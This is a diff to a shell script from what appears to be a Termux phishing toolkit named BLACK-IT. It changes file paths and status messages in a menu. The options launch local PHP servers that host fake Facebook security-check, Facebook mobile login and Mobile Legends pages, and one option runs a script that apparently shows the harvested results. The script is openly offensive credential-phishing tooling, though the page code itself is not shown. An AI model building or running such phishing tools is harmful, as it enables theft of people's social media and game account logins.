@@ -63,17 +63,17 @@ echo $pur"now open new session and run Next.sh"
 echo $ku"__________________________________"
 sleep 1
 echo $pur"  PHISING FACEBOOK SECURITY CHECK  "
-php -S localhost:8080 -t /data/data/com.termux/files/home/BLACK-IT/V1
+php -S localhost:8080 -t /data/data/com.termux/files/home/BLACK-IT/v1
 fi
 
 if [ $pil = 3 ]
 then
-echo $i"chotto a minute kudasai..."
+echo $i"Openning..."
 sleep 1
 echo $pur"now open new session and run Next.sh"
 echo $ku"_________________________________"
 echo $pur"  PHISING FACEBOOK MOBILE LOGIN"
-php -S localhost:8080 -t /data/data/com.termux/files/home/BLACK-IT/V2
+php -S localhost:8080 -t /data/data/com.termux/files/home/BLACK-IT/v2
 fi
 
 if [ $pil = 4 ]
@@ -83,12 +83,12 @@ fi
 
 if [ $pil = 5 ]
 then
-echo $i"chotto a minute kudasai..."
+echo $i"Openning..."
 sleep 1
 echo $pur"now open new session and run Next.sh"
 echo $ku"_________________________________"
 echo $pur"  PHISING MOBILE LEGEND"
-php -S localhost:8080 -t ~/PiPhish/ML
+php -S localhost:8080 -t ~/BLACK-IT/Ml
 fi
 
 if [ $pil = 6 ]
@@ -98,8 +98,8 @@ fi
 
 if [ $pil = 7 ]
 then
-cd ~/PiPhish
-sh hasil.sh
+cd ~/BLACK-IT
+sh Hasil.sh
 fi
 
 if [ $pil = 8 ]
